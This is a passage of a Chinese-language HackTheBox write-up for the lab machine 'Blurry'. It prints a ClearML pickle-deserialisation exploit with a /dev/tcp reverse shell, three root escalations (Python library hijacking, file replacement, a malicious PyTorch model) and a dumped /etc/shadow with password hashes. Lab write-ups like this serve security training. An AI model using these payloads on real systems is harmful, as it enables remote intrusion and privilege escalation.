Swan&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>], allow_archived=False)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not tasks:</span><br><span class="line">        print(<span class="string">&quot;[!] No tasks up for review.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">  </span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        print(f<span class="string">&quot;[+] Reviewing artifacts from task: &#123;task.name&#125; (ID: &#123;task.id&#125;)&quot;</span>)</span><br><span class="line">        p = <span class="keyword">Process</span>(target=process_task, args=(task,))</span><br><span class="line">        p.start()</span><br><span class="line">        threads.append(p)</span><br><span class="line">        task.set_archived(True)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">            thread.terminate()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Mark the ClearML task as completed</span></span><br><span class="line">    review_task.close()</span><br><span class="line"></span><br><span class="line">def cleanup():</span><br><span class="line">    client = APIClient()</span><br><span class="line">    tasks = client.tasks.get_all(</span><br><span class="line">        system_tags=[<span class="string">&quot;archived&quot;</span>],</span><br><span class="line">        only_fields=[<span class="string">&quot;id&quot;</span>],</span><br><span class="line">        order_by=[<span class="string">&quot;-last_update&quot;</span>],</span><br><span class="line">        page_size=<span class="number">100</span>,</span><br><span class="line">        page=<span class="number">0</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete and cleanup tasks</span></span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        <span class="comment"># noinspection PyBroadException</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            deleted_task = Task.get_task(task_id=task.id)</span><br><span class="line">            deleted_task.delete(</span><br><span class="line">                delete_artifacts_and_models=True,</span><br><span class="line">                skip_models_used_by_other_tasks=True,</span><br><span class="line">                raise_on_error=False</span><br><span class="line">            )</span><br><span class="line">        except Exception as ex:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    cleanup()</span><br></pre></td></tr></table></figure>
+
+<p>搜索 <code>ClearML exploit</code>​ 看到了這個：<a target="_blank" rel="noopener" href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/</a></p>
+<p>然後看到第一個 CVE-2024-24590: Pickle Load on Artifact Get 的視頻，他告訴你這個clearml 的python library有漏洞：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151450-im1qlyn.png" alt="image">​</p>
+<p>‍</p>
+<p>如果用戶調用 <code>task.artifacts.get()</code>​ 就會觸發反序列漏洞：</p>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151516-7hjtt41.png" alt="image">​</p>
+<p>‍</p>
+<p>反序列可以用右邊的代碼生成，然後觀察 chad jippity 這個用戶：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151707-4ts1a6j.png" alt="image">​</p>
+<p>你可以看到他確實有一個 get，所以參考視頻把代碼抄一下， 由於 upload_artifact 可以上傳一個object： <a target="_blank" rel="noopener" href="https://clear.ml/docs/latest/docs/references/sdk/task/#upload_artifact">https://clear.ml/docs/latest/docs/references/sdk/task/#upload_artifact</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151827-raxqia1.png" alt="image">​</p>
+<p>這樣就可以使用把反序列這個object使用artifact_object上傳上去就好了，代碼如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunCommand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.23/1111 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">command = RunCommand()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clearml <span class="keyword">import</span> Task</span><br><span class="line">task = Task.init(project_name=<span class="string">&#x27;Black Swan&#x27;</span>, task_name=<span class="string">&#x27;pickle_artifact_upload&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>], output_uri=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把command這個object上傳到 artifact_object</span></span><br><span class="line">task.upload_artifact(name=<span class="string">&#x27;pickle_artifact&#x27;</span>, artifact_object=command, retries=<span class="number">2</span>, wait_on_upload=<span class="literal">True</span>, extension_name=<span class="string">&quot;.pkl&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>當你把object上傳了上去之後，可以在網頁看到，已經成功解析了 <code>RunCommand</code>​ 這個類，這樣儅初始化 <code>RunCommand()</code>​ 就會執行代碼。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609152050-krdbemw.png" alt="image">​</p>
+<p>這個時候，等待用戶去執行 <code>task.artifacts.get()</code>​ 就得到了一個shell。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609152222-gz0lygv.png" alt="image">​</p>
+<h2 id="Root-Python-Library-Hijacking"><a href="#Root-Python-Library-Hijacking" class="headerlink" title="Root - Python Library Hijacking"></a>Root - Python Library Hijacking</h2><p>直接告訴你提權怎麽走，所以我沒有跑linpeas。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jippity on blurry:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User jippity may run the following commands on blurry:</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">bin</span>/evaluate_model /models/*.pth</span><br><span class="line"></span><br><span class="line">jippity@blurry:~$ file /usr/<span class="built_in">bin</span>/evaluate_model</span><br><span class="line">/usr/<span class="built_in">bin</span>/evaluate_model: Bourne-Again shell script, ASCII text executable</span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>/usr/bin/evaluate_model</code>​ 是個脚本，打開看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:~$ cat /usr/<span class="built_in">bin</span>/evaluate_model</span><br><span class="line"><span class="comment">#!/bin/bash                                                                                   </span></span><br><span class="line"><span class="comment"># Evaluate a given model against our proprietary dataset.</span></span><br><span class="line"><span class="comment"># Security checks against model file included.                                                </span></span><br><span class="line">                                             </span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$#&quot;</span> -ne <span class="number">1</span> ]; then</span><br><span class="line">    /usr/<span class="built_in">bin</span>/echo <span class="string">&quot;Usage: $0 &lt;path_to_model.pth&gt;&quot;</span></span><br><span class="line">    exit <span class="number">1</span>                                                                                                                                                                                </span><br><span class="line">fi                                                                                          </span><br><span class="line"></span><br><span class="line">MODEL_FILE=<span class="string">&quot;$1&quot;</span>                                                                                                                                                                           </span><br><span class="line">TEMP_DIR=<span class="string">&quot;/models/temp&quot;</span>                                                                                                                                                                   </span><br><span class="line">PYTHON_SCRIPT=<span class="string">&quot;/models/evaluate_model.py&quot;</span> </span><br><span class="line"></span><br><span class="line">..........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;$MODEL_FILE&quot;</span> ]; then</span><br><span class="line">    /usr/<span class="built_in">bin</span>/echo <span class="string">&quot;[+] Model $MODEL_FILE is considered safe. Processing...&quot;</span></span><br><span class="line">    /usr/<span class="built_in">bin</span>/python3 <span class="string">&quot;$PYTHON_SCRIPT&quot;</span> <span class="string">&quot;$MODEL_FILE&quot;</span></span><br><span class="line">  </span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>你看到他調用了 <code>/usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;</code>​，</p>
+<p>剛好 <code>PYTHON_SCRIPT=&quot;/models/evaluate_model.py&quot;</code>​ ，</p>
+<p>也就是說這個脚本會調用 <code>/models/evaluate_model.py</code>​，所以去看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:/models$ ls -lah</span><br><span class="line">total <span class="number">1.1</span>M</span><br><span class="line">drwxrwxr-x  <span class="number">2</span> root jippity <span class="number">4.0</span>K May <span class="number">30</span> <span class="number">10</span>:<span class="number">32</span> .</span><br><span class="line">drwxr-xr-x <span class="number">19</span> root root    <span class="number">4.0</span>K Jun  <span class="number">3</span> 09:<span class="number">28</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> root root    <span class="number">1.1</span>M May <span class="number">30</span> 04:<span class="number">39</span> demo_model.pth</span><br><span class="line">-rw-r--r--  <span class="number">1</span> root root    <span class="number">2.5</span>K May <span class="number">30</span> 04:<span class="number">38</span> evaluate_model.py</span><br></pre></td></tr></table></figure>
+
+<p>這裏面就兩個文件，但是cat了一下脚本，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:/models$ cat evaluate_model.py                                                                                                                                             </span><br><span class="line"><span class="keyword">import</span> torch                                                                                                                                                                              </span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn                                                                                                                                                                     </span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms                                                                                                                                                        </span><br><span class="line"><span class="keyword">from</span> torchvision.datasets <span class="keyword">import</span> CIFAR10                                                                                                                                                  </span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader, Subset                                                                                                                                           </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np                                                                                                                                                                        </span><br><span class="line"><span class="keyword">import</span> sys                  </span><br></pre></td></tr></table></figure>
+
+<p>然後發現這個目錄怎麽會有寫入權限。。所以可以使用 <code>python library hijacking</code>​ 這個技術得到root：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;import os; os.system(&quot;bash&quot;)&#x27;</span> &gt; /models/torch.py</span><br><span class="line">sudo /usr/<span class="built_in">bin</span>/evaluate_model /models/demo_model.pth</span><br></pre></td></tr></table></figure>
+
+<p>類似：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:/models$ echo <span class="string">&#x27;import os; os.system(&quot;bash&quot;)&#x27;</span> &gt; /models/torch.py</span><br><span class="line">sudo /usr/<span class="built_in">bin</span>/evaluate_model /models/demo_model.pth</span><br><span class="line">[+] Model /models/demo_model.pth <span class="keyword">is</span> considered safe. Processing...</span><br><span class="line">root@blurry:/models<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@blurry:/models<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="Root-Replace-evaluate-model-py"><a href="#Root-Replace-evaluate-model-py" class="headerlink" title="Root - Replace evaluate_model.py"></a>Root - Replace evaluate_model.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jippity@blurry:/models$ ls -lah</span><br><span class="line">total <span class="number">1.1</span>M</span><br><span class="line">drwxrwxr-x  <span class="number">3</span> root jippity <span class="number">4.0</span>K Jun  <span class="number">9</span> 03:<span class="number">36</span> .</span><br><span class="line">drwxr-xr-x <span class="number">19</span> root root    <span class="number">4.0</span>K Jun  <span class="number">3</span> 09:<span class="number">28</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> root root    <span class="number">1.1</span>M May <span class="number">30</span> 04:<span class="number">39</span> demo_model.pth</span><br><span class="line">-rw-r--r--  <span class="number">1</span> root root    <span class="number">2.5</span>K May <span class="number">30</span> 04:<span class="number">38</span> evaluate_model.py</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root    <span class="number">4.0</span>K Jun  <span class="number">9</span> 03:<span class="number">26</span> __pycache__</span><br><span class="line">jippity@blurry:/models$ rm evaluate_model.py </span><br><span class="line">rm: remove write-protected regular file <span class="string">&#x27;evaluate_model.py&#x27;</span>? y</span><br><span class="line">jippity@blurry:/models$ ls</span><br><span class="line">demo_model.pth  __pycache__</span><br><span class="line">jippity@blurry:/models$ echo <span class="string">&#x27;import os; os.system(&quot;bash&quot;)&#x27;</span> &gt; evaluate_model.py</span><br><span class="line"></span><br><span class="line">jippity@blurry:/models$ sudo /usr/<span class="built_in">bin</span>/evaluate_model /models/demo_model.pth </span><br><span class="line">[+] Model /models/demo_model.pth <span class="keyword">is</span> considered safe. Processing...</span><br><span class="line">root@blurry:/models<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root@blurry:/models<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240610175652-0h9xl9q.png" alt="image">​</p>
+<p>你可以看到這個目錄屬於 <code>jippity</code>​ 這個用戶，所以實際上是可以刪除下面的文件的，即使他是root。</p>
+<p>你現在沒有權限可以改裏面的文件，但是不代表你不可以刪除。所以刪除掉這個文件重新寫入一個shell，這樣也可以得到root。</p>
+<h2 id="Root-當然也可以製作一個模型來得到root"><a href="#Root-當然也可以製作一個模型來得到root" class="headerlink" title="Root - 當然也可以製作一個模型來得到root"></a>Root - 當然也可以製作一個模型來得到root</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomModel</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(CustomModel, self).__init__()</span><br><span class="line">        self.linear = nn.Linear(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> self.linear(x)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&quot;bash&quot;</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (cmd,)</span><br><span class="line"></span><br><span class="line">model = CustomModel()</span><br><span class="line">torch.save(model, <span class="string">&#x27;/models/evil.pth&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>類似這樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609153608-g957puw.png" alt="image">​</p>
+<p>‍</p>
+<p>其實還有另一種提權的方法，也就是 <code>Race condition</code>​：從脚本可以看到，他是解壓了之後才分析，如果在解壓完了替換掉一開始解壓的文件，也可以得到root。</p>
+<p>‍</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">root:$y$j9T$HKjGxAyjzW3lmf/HmZafW0$fgkQykeZSlRYHzR8zHjMVQrRUzwM3xSvA0koPgt6TQ6:<span class="number">19770</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">bin</span>:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sys:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">man:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">news:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uucp:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">proxy:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">www-data:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">backup:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">list</span>:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">irc:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">gnats:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_apt:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-resolve:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">messagebus:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-timesync:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sshd:*:<span class="number">19668</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-coredump:!*:<span class="number">19668</span>::::::</span><br><span class="line">jippity:$y$j9T$WUn.W06MZ94pp.Zq4HANr/$UAdCX7HojvUwcmzTO6.xcwCWvxrKneaoRAPqpFf1G6D:<span class="number">19770</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_laurel:!:<span class="number">19871</span>::::::</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#109;&#97;&#x6e;&#x65;&#x40;&#x6d;&#97;&#x6e;&#101;&#115;&#x65;&#x63;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x6e;&#x65;&#x40;&#x6d;&#97;&#x6e;&#101;&#115;&#x65;&#x63;&#x2e;&#99;&#111;&#x6d;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#97;&#x6e;&#101;&#64;&#x6d;&#97;&#x6e;&#101;&#x73;&#x65;&#x63;&#x2e;&#99;&#111;&#109;">&#x6d;&#97;&#x6e;&#101;&#64;&#x6d;&#97;&#x6e;&#101;&#x73;&#x65;&#x63;&#x2e;&#99;&#111;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&text=HackTheBox - Machine - Blurry"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&is_video=false&description=HackTheBox - Machine - Blurry"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Blurry&body=Check out this article: https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&name=HackTheBox - Machine - Blurry&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&t=HackTheBox - Machine - Blurry"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
